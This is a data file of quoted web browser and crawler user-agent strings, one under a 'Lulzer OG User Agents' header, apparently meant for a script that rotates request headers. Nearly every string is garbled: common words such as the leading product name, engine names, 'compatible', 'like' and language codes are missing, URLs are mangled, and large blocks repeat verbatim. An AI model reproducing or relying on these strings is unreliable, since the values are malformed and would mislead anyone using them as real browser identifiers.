	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /1.0.154.48 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.19 KHTML,  Gecko /1.0.154.46 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.1; -US /525.19 KHTML,  Gecko /1.0.154.43 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.19 KHTML,  Gecko /1.0.154.43 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.2; -US /525.19 KHTML,  Gecko /1.0.154.43 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /1.0.154.43 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.19 KHTML,  Gecko /1.0.154.42 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /1.0.154.39 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.19 KHTML,  Gecko /0.4.154.31 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /0.4.154.18 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /528.4 KHTML,  Gecko /0.3.155.0 Safari/528.4"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /0.3.155.0 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.1; -US /525.19 KHTML,  Gecko /0.3.154.9 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.2; -US /525.19 KHTML,  Gecko /0.3.154.6 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /0.2.153.1 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.19 KHTML,  Gecko /0.2.153.0 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /0.2.153.0 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.19 KHTML,  Gecko /0.2.152.0 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /0.2.152.0 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.19 KHTML,  Gecko /0.2.151.0 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.2; -US /525.19 KHTML,  Gecko /0.2.151.0 Safari/525.19"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.19 KHTML,  Gecko /0.2.151.0 Safari/525.19"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.13 KHTML,  Gecko /0.2.149.6 Safari/525.13"
	"/5.0 Windows; U; Windows NT 5.2; -US /525.13 KHTML,  Gecko /0.2.149.6 Safari/525.13"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.13 KHTML,  Gecko /0.2.149.30 Safari/525.13"
	"/5.0 Windows; U; Windows NT 5.2; -US /525.13 KHTML,  Gecko /0.2.149.30 Safari/525.13"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.13 KHTML,  Gecko /0.2.149.29 Safari/525.13"
	"/5.0 Windows; U; Windows NT 5.2; -US /525.13 KHTML,  Gecko /0.2.149.29 Safari/525.13"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.13 KHTML,  Gecko /0.2.149.29 Safari/525.13"
	"/5.0 Windows; U; Windows NT 6.0; -US /525.13 KHTML,  Gecko /0.2.149.27 Safari/525.13"
	"/5.0 Windows; U; Windows NT 6.0;  /525.13 KHTML,  Gecko /0.2.149.27 Safari/525.13"
	"/5.0 Windows; U; Windows NT 5.2; -US /525.13 KHTML,  Gecko /0.2.149.27 Safari/525.13"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.13KHTML,  Gecko /0.2.149.27 Safari/525.13"
	"/5.0 Windows; U; Windows NT 5.1; -US /525.13 KHTML,  Gecko /0.2.149.27 Safari/525.13"
	"/5.0 Windows; U; Windows NT 5.0; -US /525.13 KHTML,  Gecko /0.2.149.27 Safari/525.13"
	"/5.0 Linux; U; -US /525.13 KHTML,  Gecko /0.2.149.27 Safari/525.13"
	"/5.0 Macintosh; U; Mac OS X 10_6_1; -US /530.5 KHTML,  Gecko / Safari/530.5"
	"/5.0 Macintosh; U; Mac OS X 10_5_7; -US /530.5 KHTML,  Gecko / Safari/530.5"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -US /530.9 KHTML,  Gecko / Safari/530.9"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -US /530.6 KHTML,  Gecko / Safari/530.6"
	"/5.0 Macintosh; U; Intel Mac OS X 10_5_6; -US /530.5 KHTML,  Gecko / Safari/530.5"



#################################
##     Lulzer OG User Agents   ##
#################################


	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"-; +://.com/; : webetrex"
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 ; 008/0.83; ://www.80legs.com/webcrawler.html Gecko/2008032620"
	"/4.0 ; MSIE 7.0; Windows NT 6.0  www.idealobserver.com"
	"/5.0 ; /1.0; +://www.anyapex.com/.html"
	"/4.0 ; Arachmo"
	"/4.0 ; B-l-i--z-B-O-T"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; /2.3; MSIE 6.0 ; +://.com/site_owners.html"
	"/1.0 +://.com/crawler/"
	"/5.0 ; /2.0; +://.com/.htm"
	"Sqworm/2.9.85-BETA beta_release; 20011115-775; i686-pc-linux-"
	"/5.0 ; YandexImages/3.0; +://yandex.com/bots"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/4.0  /1.0  Link Checker @; ://.com"
	"/4.0  /1.0  Link Checker .dlc@; ://.com"
	"/4.0  /1.0 -@; ://.com"
	"/5.0 ; U;  0.6;  /420+ KHTML,  Gecko"
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;  Browser"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser; GTB6; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko, Safari/419.3 /1.0.ALPHA"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko ChromePlus/4.0.222.3 /4.0.222.3 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
	"Links 2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; "
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A"
	"/5.0 PLAYSTATION 3; 3.55"
	"/5.0 PLAYSTATION 3; 2.00"
	"/5.0 PLAYSTATION 3; 1.00"
	"/5.0 Windows NT 6.3; WOW64; rv:24.0 Gecko/20100101 /24.4.0"
	"/5.0 ; /1.0; +://www.abilogic.com/.html"
	"SiteBar/3.3.8 Bookmark Server; :///"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"/4.0 ;  3.0; Macintosh"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 FM  4.6.1"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729 Prevx 3.0.5 "
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071004 Iceweasel/2.0.0.8 -2.0.0.6+2.0.0.8-Oetch1"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07}"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=;  DSL 1.1; "
	"/4.0 ; MSIE 5.5; Windows 98"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.51"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600# Pack 1#2#5#154321|"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1;  Toolbar; ; .NET CLR 1.1.4322"
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/2.1 ://.com/.html"
	"/9.20 Windows NT 6.0; U; "
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 -2.0.0.1+-2"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; /4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322"
	"/10.00 X11; Linux i686; U;  Presto/2.2.0"
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 ; Yahoo! /3.0; ://.yahoo.com//us/ysearch/"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13"
	"/4.0 ; MSIE 9.0; Windows NT 5.1; /5.0"
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 7.0b; Windows NT 6.0"
	"/4.0 ; MSIE 6.0b; Windows 98"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8"
